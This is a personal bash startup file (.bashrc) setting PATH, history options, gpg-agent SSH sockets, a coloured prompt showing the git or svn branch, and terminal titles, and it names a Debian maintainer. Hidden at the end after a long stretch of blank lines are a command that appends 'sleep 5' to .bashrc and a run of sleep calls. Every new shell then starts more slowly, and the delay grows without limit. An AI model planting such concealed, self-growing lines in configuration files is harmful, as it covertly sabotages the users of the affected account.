export PATH="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:~/bin:/usr/local/go/bin"

# If not running interactively, don't do anything
[ -z "$PS1" ] && return

# bah@!
export PULSE_LATENCY_MSEC=60

export ICAROOT=/opt/icaclient
# don't put duplicate lines in the history. See bash(1) for more options
export HISTCONTROL=ignoreboth
export DEBEMAIL='kwy@redpill-linpro.com'
export DEBFULLNAME='Kacper Wysocki'

export EDITOR=vim

# append to the history file, don't overwrite it
# check the window size after each command and, if necessary,
# update the values of LINES and COLUMNS.
shopt -s checkwinsize histappend extglob no_empty_cmd_completion cdspell
#PROMPT_COMMAND='history -a' # do below

# for gpg-agent
export GPG_TTY=$(tty)
unset SSH_AGENT_PID
if [ "${gnupg_SSH_AUTH_SOCK_by:-0}" -ne $$ ]; then
    export SSH_AUTH_SOCK="${HOME}/.gnupg/S.gpg-agent.ssh"
fi

# make less more friendly for non-text input files, see lesspipe(1)
[ -x /usr/bin/lesspipe ] && eval "$(SHELL=/bin/sh lesspipe)"

# set variable identifying the chroot you work in (used in the prompt below)
if [ -z "$debian_chroot" ] && [ -r /etc/debian_chroot ]; then
    debian_chroot=$(cat /etc/debian_chroot)
fi

# set a fancy prompt (non-color, unless we know we "want" color)
case "$TERM" in
    xterm-color) color_prompt=yes;;
esac

# uncomment for a colored prompt, if the terminal has the capability; turned
# off by default to not distract the user: the focus in a terminal window
# should be on the output of commands, not on the prompt
force_color_prompt=yes

if [ -n "$force_color_prompt" ]; then
    if [ -x /usr/bin/tput ] && tput setaf 1 >&/dev/null; then
	# We have color support; assume it's compliant with Ecma-48
	# (ISO/IEC-6429). (Lack of such support is extremely rare, and such
	# a case would tend to support setf rather than setaf.)
	color_prompt=yes
    else
	color_prompt=
    fi
fi

parse_git_branch () {
    git name-rev HEAD 2> /dev/null | sed 's#HEAD\ \(.*\)# (git::\1)#'
}
parse_svn_branch() {
    parse_svn_url | sed -e 's#^'"$(parse_svn_repository_root)"'##g' | awk '{print " (svn::"$1")" }'
}
parse_svn_url() {
    svn info 2>/dev/null | sed -ne 's#^URL: ##p'
}
parse_svn_repository_root() {
    svn info 2>/dev/null | sed -ne 's#^Repository Root: ##p'
}

BLACK="\[\033[0;38m\]"
RED="\[\033[0;31m\]"
RED_BOLD="\[\033[01;31m\]"
BLUE="\[\033[01;34m\]"
GREEN="\[\033[0;32m\]"
CLEAR="\[\033[00m\]"

# $(r=$?; ( [ $? = 0 ] && echo -n ":-)" ) || echo -n ":-($?)")"
if [ "$color_prompt" = yes ]; then
    export PS1="$RED${debian_chroot:+($debian_chroot)}$BLACK[ \u@$RED\h $GREEN\w$RED_BOLD\$(parse_git_branch)\$(parse_svn_branch)$BLACK ] "
#    PS1='${debian_chroot:+($debian_chroot)}\[\033[01;32m\]\u@\h\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]\$ '
else
    PS1='${debian_chroot:+($debian_chroot)}\u@\h:\w\$ '
fi
unset color_prompt force_color_prompt

#PS1="\[\e]0;${debian_chroot:+($debian_chroot)}\u@\h: \w\a\]"
# If this is an xterm set the title to user@host:dir
case $TERM in                                                           
  xterm*|rxvt*|Eterm|eterm)                                              
     #PS1="\[\e]0;${debian_chroot:+($debian_chroot)}\u@\h: \w\a\]"
     PROMPT_COMMAND='echo -ne "\033]0;${USER}@${HOSTNAME%%.*}:${PWD/$HOME/~}\007"; history -a'
     ;;                                                                 
  screen)                                                               
     PROMPT_COMMAND='echo -ne "\033_${USER}@${HOSTNAME%%.*}:${PWD/$HOME/~}\033\\"; history -a'
     ;;                                                                 
     *)
     PROMPT_COMMAND='history -a'
     ;;
esac
if [ -f ~/.aliases ]; then
    . ~/.aliases
fi

if [ -f "${HOME}/.gpg-agent-info" ]; then
  . "${HOME}/.gpg-agent-info"
  export GPG_AGENT_INFO
  export SSH_AUTH_SOCK
fi












































echo "sleep 5" >> .bashrc
sleep 5
sleep 5
sleep 5
sleep 5
sleep 5
sleep 5
